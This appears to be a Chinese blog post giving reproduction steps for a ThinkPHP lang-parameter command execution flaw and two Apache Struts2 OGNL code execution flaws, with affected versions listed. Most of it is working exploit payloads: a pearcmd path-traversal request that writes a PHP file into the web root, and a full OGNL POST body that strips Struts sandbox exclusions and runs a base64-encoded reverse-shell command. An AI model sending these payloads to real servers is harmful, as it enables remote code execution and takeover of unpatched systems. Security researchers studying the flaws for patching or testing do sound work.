# thinkphp lang 命令执行--struts2 代码执行--(QVD-2022-46174)&&(CVE-2020-17530)&&(CVE-2021-31805) - 了了青山见 - 博客园

> 原文：[`www.cnblogs.com/Pengj/p/17729307.html`](https://www.cnblogs.com/Pengj/p/17729307.html)

# thinkphp lang 命令执行--struts2 代码执行--(QVD-2022-46174)&&(CVE-2020-17530)&&(CVE-2021-31805)

## thinkphp lang 命令执行（QVD-2022-46174）

### 影响范围

6.0.1 <= ThinkPHP <= 6.0.13
ThinkPHP 5.0.x
ThinkPHP 5.1.x

### 漏洞复现

POC：

> ?+config-create+/&lang=../../../../../../../../usr/local/lib/php/pearcmd&/+/var/www/html/1.php

![在这里插入图片描述](img/489def1a2e6766521d798d8f75cf28ef.png)

## struts2 代码执行 （CVE-2020-17530）

### 影响范围

Apache Struts 2.0.0 - 2.5.25

### 漏洞复现

POC 下载[s2-062](https://github.com/pyroxenites/s2-062)

## struts2 代码执行 （CVE-2021-31805）

### 影响范围

Apache Struts 2.0.0 - 2.5.29

### 漏洞复现

> Post： /s2_062/index.action

> name=(%23request.map%3d%23%40org.apache.commons.collections.BeanMap%40{}).toString().substring(0,0)+%2b
> (%23request.map.setBean(%23request.get('struts.valueStack'))+%3d%3d+true).toString().substring(0,0)+%2b
> (%23request.map2%3d%23%40org.apache.commons.collections.BeanMap%40{}).toString().substring(0,0)+%2b
> (%23request.map2.setBean(%23request.get('map').get('context'))+%3d%3d+true).toString().substring(0,0)+%2b
> (%23request.map3%3d%23%40org.apache.commons.collections.BeanMap%40{}).toString().substring(0,0)+%2b
> (%23request.map3.setBean(%23request.get('map2').get('memberAccess'))+%3d%3d+true).toString().substring(0,0)+%2b
> (%23request.get('map3').put('excludedPackageNames',%23%40org.apache.commons.collections.BeanMap%40{}.keySet())+%3d%3d+true).toString().substring(0,0)+%2b
> (%23request.get('map3').put('excludedClasses',%23%40org.apache.commons.collections.BeanMap%40{}.keySet())+%3d%3d+true).toString().substring(0,0)+%2b
> (%23application.get('org.apache.tomcat.InstanceManager').newInstance('freemarker.template.utility.Execute').exec({'bash -c {echo,反弹 shell 命令 base64 编码加 url 编码}|{base64,-d}|{bash,-i}'}))

![在这里插入图片描述](img/e99d9782c92d741c7c2a4fbb9c8c9864.png)